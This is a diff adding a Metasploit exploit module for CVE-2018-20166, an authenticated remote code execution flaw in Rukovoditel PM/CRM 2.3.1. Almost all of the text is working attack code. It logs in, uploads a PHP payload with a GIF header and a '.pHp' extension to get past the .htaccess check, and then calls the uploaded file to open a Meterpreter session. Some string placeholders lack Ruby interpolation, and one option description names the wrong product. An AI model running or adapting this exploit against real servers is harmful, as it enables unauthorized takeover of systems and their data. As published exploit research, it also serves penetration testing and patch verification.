@@ -1,0 +1,204 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'uri'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+    def initialize
+    super(
+      'Name'           => 'Rukovoditel Project Management/CRM 2.3.1 -
+(Authenticated) Remote Code Execution',
+      'Description'    => %q{
+        This module exploits a file upload vulnerability in Rukovoditel
+PM/CRM version 2.3.1.
+        Application allows the user to upload a background image, and does
+not perform extension checking exactly.
+        Application agrees to upload if "gif" file header is added to the
+header of our payload file.
+        However, many file types do not have permission to work.
+".htaccess" is blocking that.
+        it has file extension check as follows,
+        <FilesMatch "\.(php([0-9]|s)?|s?p?html|cgi|pl|exe)$">
+        There is no upper and lower case control. Therefore, the extension
+of our file can be .pHp .Php .PhP and such.
+        The module is uploading by create a payload as above to get
+Meterpreter session.
+      },
+      'Author'         => [
+        'AkkuS <Özkan Mustafa Akkuş>', # Vulnerability Discovery, PoC & Msf
+Module
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['URL', '
+https://pentest.com.tr/exploits/Rukovoditel-Project-Management-CRM-2-3-1-Authenticated-Remote-Code-Execution.html'],
+
+          ['CVE', '2018-20166'],
+        ],
+      'Platform'       => ['php'],
+      'Arch'           => ARCH_PHP,
+      'Targets'        =>
+        [
+          ['Rukovoditel PM/CRM <= 2.3.1', {}]
+        ],
+      'DisclosureDate' => '14 Dec 2018',
+      'Privileged'     => false,
+      'DefaultTarget' => 0
+    )
+
+    register_options(
+        [
+          OptString.new('TARGETURI', [true, 'The base path to i-doit',
+'/']),
+          OptString.new('USER', [true, 'User to login with', 'admin']),
+          OptString.new('PASS', [true, 'Password to login with',
+'password']),
+        ], self.class)
+    end
+##
+# Exploitation of Vulnerability
+##
+  def exploit
+
+    random_value = Rex::Text.rand_text_alpha(10)
+    sid_md5 = Digest::MD5.hexdigest random_value
+    print_status("sid = #{sid_md5}")
+
+    cookie = "cookie_test=please_accept_for_session;" + " sid=" + sid_md5
+
+    res1 = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri,
+"/index.php?module=users/login"),
+      'cookie'   => cookie,
+    })
+        if not (res1 and res1.body =~ /form_session_token\"
+value=\"([^\"]+)\"/)
+            return nil
+        end
+    token = $1
+##
+# Authorized User Login
+##
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri,
+"/index.php?module=users/login&action=login"),
+      'cookie'   => cookie,
+      'vars_post' => {
+          "form_session_token" => token,
+          "username" => datastore['USER'],
+          "password" => datastore['PASS']
+
+      }
+    })
+##
+# Login Control
+##
+
+    tok = send_request_cgi({
+      'method'   => 'GET',
+      'cookie'   => cookie,
+      'uri'      => normalize_uri(target_uri,
+"/index.php?module=dashboard/"),
+    })
+
+    html = tok.body
+    if html =~ /Rukovoditel/
+      print_good("Login Successful")
+    else
+      print_status("User information is incorrect. Login failed")
+      exit 0
+    end
+##
+# Arbitrary ".pHp" file upload
+##
+
+    boundary = Rex::Text.rand_text_alphanumeric(29)
+
+    data = "-----------------------------{boundary}\r\n"
+    data << "Content-Disposition: form-data;
+name=\"form_session_token\"\r\n"
+    data << "\r\n"
+    data << "{token}"
+    data << "\r\n-----------------------------{boundary}\r\n"
+    data << "Content-Disposition: form-data;
+name=\"CFG[LOGIN_PAGE_HEADING]\"\r\n"
+    data <<
+"\r\nPage-Heading\r\n-----------------------------{boundary}\r\n"
+    data << "Content-Disposition: form-data;
+name=\"CFG[LOGIN_PAGE_CONTENT]\"\r\n"
+    data << "\r\nPage-Desc\r\n-----------------------------{boundary}\r\n"
+    data << "Content-Disposition: form-data;
+name=\"APP_LOGIN_PAGE_BACKGROUND\"; filename=\"akkus.pHp\"\r\n"
+    data << "Content-Type: binary/octet-stream\r\n"
+    data << "\r\n"
+    data << "GIF89a;\n<html>\n"
+    data << "\n</html>\n"
+    data << payload.encoded
+    data << "\r\n-----------------------------{boundary}\r\n"
+    data << "Content-Disposition: form-data;
+name=\"CFG[APP_LOGIN_PAGE_BACKGROUND]\"\r\n"
+    data << "\r\n{upload_name}\r\n"
+    data << "-----------------------------{boundary}\r\n"
+    data << "Content-Disposition: form-data;
+name=\"CFG[LOGIN_PAGE_HIDE_REMEMBER_ME]\"\r\n"
+    data << "\r\n0\r\n-----------------------------{boundary}--\r\n"
+
+    res2 = send_request_cgi({
+      'method' => 'POST',
+      'data'  => data,
+      'headers' =>
+      {
+        'Content-Type'   => 'multipart/form-data;
+boundary=---------------------------{boundary}',
+        'cookie'   => cookie,
+      },
+      'uri' => normalize_uri(target_uri,
+"/index.php?module=configuration/save&redirect_to=configuration/login_page")
+
+    })
+
+
+##
+# Informations
+##
+    print_status("#{peer} - Uploading in progress...")
+    print_good("Upload Successful")
+##
+# Calling Shell File Name
+##
+    shellc = send_request_cgi({
+      'method'   => 'GET',
+      'cookie'   => cookie,
+      'uri'      => normalize_uri(target_uri,
+"/index.php?module=configuration/login_page"),
+    })
+
+        if not (shellc and shellc.body =~ /CFG_APP_LOGIN_PAGE_BACKGROUND\"
+value=\"([^\"]+)\"/)
+            return nil
+        end
+    shelln = $1
+    print_good("#{peer} - Payload uploaded as #{shelln}")
+    register_file_for_cleanup(shelln)
+##
+# Get Session
+##
+    send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri, "/uploads/", shelln),
+    })
+
+  end
+end
